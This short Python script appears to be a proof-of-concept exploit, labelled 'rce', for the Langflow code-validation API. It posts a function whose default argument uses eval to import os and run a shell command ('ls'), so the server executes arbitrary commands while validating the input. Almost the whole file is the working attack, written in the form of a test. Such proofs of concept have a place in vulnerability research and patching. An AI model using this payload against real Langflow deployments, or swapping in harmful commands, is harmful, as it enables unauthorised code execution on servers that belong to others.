from fastapi.testclient import TestClient

# rce

def client():
    from langflow.main import create_app

    app = create_app()

    with TestClient(app) as client:
        return client

def test_post_validate_code(client: TestClient, code):
    # Test case with a valid import and function
    response1 = client.post("api/v1/validate/code", json={"code": code})
    print(response1.json())
    assert response1.status_code == 200
    assert response1.json() == {"imports": {"errors": []}, "function": {"errors": []}}

code = """
def x(y=eval('__import__("os").system("ls")')):
    pass
"""

test_post_validate_code(client(), code)